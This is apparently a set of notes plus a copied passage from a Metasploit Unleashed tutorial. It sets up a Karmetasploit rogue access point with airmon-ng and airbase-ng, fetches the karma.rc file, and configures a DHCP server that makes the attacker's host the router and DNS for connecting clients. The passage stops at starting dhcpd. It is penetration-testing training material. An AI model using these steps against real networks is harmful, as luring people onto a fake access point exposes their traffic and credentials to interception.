1. Obtain the run control file (above)
2. Setup the intrastructure (IP address, DHCP server etc.)
```bash
wget https://www.offsec.com/wp-content/uploads/2015/04/karma.rc_.txt
sudo apt update
sudo apt -y install isc-dhcp-server
```

`cat /etc/dhcp/dhcpd.conf`

Requirements
```shell
sudo apt -y install libsqlite3-dev
gem install activerecord sqlite3
```

- Locate wireless card
- Start wireless adapter in monitor mode with `airmon-ng`

```shell
root@kali:~# airmon-ng start wlan0
```

```shellsession
root@kali:~# airbase-ng -P -C 30 -e "U R PWND" -v wlan0mon
For information, no action required: Using gettimeofday() instead of /dev/rtc
22:52:25  Created tap interface at0
22:52:25  Trying to set MTU on at0 to 1500
22:52:25  Trying to set MTU on wlan0mon to 1800
22:52:25  Access Point with BSSID 00:C0:CA:82:D9:63 started.
```

Airbase-ng has created a new interface for us, ‘at0’. This is the interface we will now use. We will now assign ourselves an IP address.

```shellsession
root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
root@kali:~#
```


[a11y.text Karmetasploit Configuration](https://www.offsec.com/metasploit-unleashed/karmetasploit-configuration/#karmetasploit-configuration)

There is a bit of setup required to get [Karmetasploit](https://www.offsec.com/metasploit-unleashed/karmetasploit/) up and going on Kali Linux Rolling. The first step is to obtain the run control file for Karmetasploit:

```shellsession
root@kali:~# wget https://www.offsec.com/wp-content/uploads/2015/04/karma.rc_.txt
--2015-04-03 16:17:27-- https://www.offsec.com/downloads/karma.rc

root@kali:~#
```

Having obtained that requirement, we need to set up a bit of the infrastructure that will be required. When clients attach to the fake AP we run, they will be expecting to be assigned an IP address. As such, we need to put a DHCP server in place. Let’s install a DHCP server onto Kali.

```shellsession
root@kali:~# apt update
...snip...
root@kali:~# apt -y install isc-dhcp-server
Reading package lists... Done
Building dependency tree
Reading state information... Done
...snip...
root@kali:~#
```

Next, let’s configure our **dhcpd.conf** file. We will replace the configuration file with the following output:

```shellsession
root@kali:~# cat /etc/dhcp/dhcpd.conf
option domain-name-servers 10.0.0.1;

default-lease-time 60;
max-lease-time 72;

ddns-update-style none;

authoritative;

log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option domain-name-servers 10.0.0.1;
}
root@kali:~#
```

Then we need to install a couple of requirements.

```shellsession
root@kali:~# apt -y install libsqlite3-dev
Reading package lists... Done
Building dependency tree
Reading state information... Done
...snip...
root@kali:~# gem install activerecord sqlite3

```

Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with **airmon-ng**. Afterwards we use **airbase-ng** to start a new wireless network.

```shellsession
root@kali:~# airmon-ng

phy0	wlan0	        ath9k_htc	Atheros Communications, Inc. AR9271 802.11n

root@kali:~# airmon-ng start wlan0

Found 2 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

```

Airbase-ng has created a new interface for us, ‘at0’. This is the interface we will now use. We will now assign ourselves an IP address.

```shellsession
root@kali:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
root@kali:~#
```

Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.

```shellsession
root@kali:~# touch /var/lib/dhcp/dhcpd.leases
root@kali:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
